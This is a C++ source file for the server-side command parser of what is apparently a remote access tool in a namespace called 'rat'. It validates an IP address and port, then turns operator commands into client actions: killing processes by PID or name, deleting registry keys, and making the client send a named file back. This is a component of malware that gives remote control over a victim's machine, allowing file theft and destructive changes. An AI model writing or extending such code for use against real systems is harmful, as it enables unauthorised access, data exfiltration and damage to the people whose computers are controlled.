#include "servercmd.h"

namespace rat{

bool ServerCmd::IsIPv4Address(const std::string& address) const
{
    int cnt = 0;
	std::istringstream iss(address);
	std::string s;
	char delim = '.';
	while (getline(iss, s, delim))
    {
		try 
        {
			if (int num = std::stoi(s); num < 0 || num > 255)
            {
				return false;
			}
			cnt++;
		}
		catch (std::invalid_argument&)
        {
			return false;
		}
		catch (std::out_of_range&)
        {
			return false;
		}
	}
	return cnt == 4;
}

ServerCmd::ServerCmd()
{
    SetType(-1);
};

ServerCmd::ServerCmd(const std::string& input)
{
    if (strlen(&input[0]) >= 990){
        SetType(-1);
        return;
    }

    if (input.empty()) return;

    std::istringstream iss(input);
    std::string ip;
    std::string port;
    std::string command;
    iss >> ip >> port >> command;
    if (!IsIPv4Address(ip) || !std::ranges::all_of(port.begin(), port.end(), ::isdigit)){
        SetType(-1);
        return;
    }
    ip_address_ = ip;
    port_ = std::stoi(port);
    if (command == "kill") 
    {
        std::string subcommand;
        iss >> subcommand;

        if (subcommand == "pid")
        {
            std::string pid_str;
            iss >> pid_str;
            if(std::ranges::all_of(pid_str.begin(), pid_str.end(), ::isdigit))
            {
                SetType(static_cast<int>(rat::Command::CommandType::kClientKillPid));
                SetArgument(pid_str);
            }
            else
            {
                SetType(- 1);
            }
        }
        else if (subcommand == "pname") 
        {
            std::string pname;
            iss >> std::ws;
            getline(iss, pname);
            SetType(static_cast<int>(rat::Command::CommandType::kClientKillProcessName));
            SetArgument(pname);
        }
        else 
        {
            SetType(-1);
        }
    }
    else if (command == "delete")
    {
        std::string subcommand;
        std::string root_key;
        std::string sub_key;
        iss >> subcommand >> root_key;
        iss >> std::ws;
        getline(iss, sub_key);
        if (!subcommand.size() || !root_key.size() || !sub_key.size())
        {
            SetType(-1);
        }
        else
        {
            SetType(static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry));
            SetArgument(subcommand + " " + sub_key);
        }
    }
    else if (command == "get")
    {
        std::string file_path;
        iss >> std::ws;
        getline(iss, file_path);
        if (!file_path.size())
        {
            SetType(-1);
        }
        else
        {
            SetArgument(file_path);
            SetType(static_cast<int>(rat::Command::CommandType::kClientSendFile));
        }
    }
    else
    {
        SetType(-1);
    }
}

std::string ServerCmd::GetIpAddress() const
{
    return ip_address_;
}

int ServerCmd::GetPort() const
{
    return port_;
}



}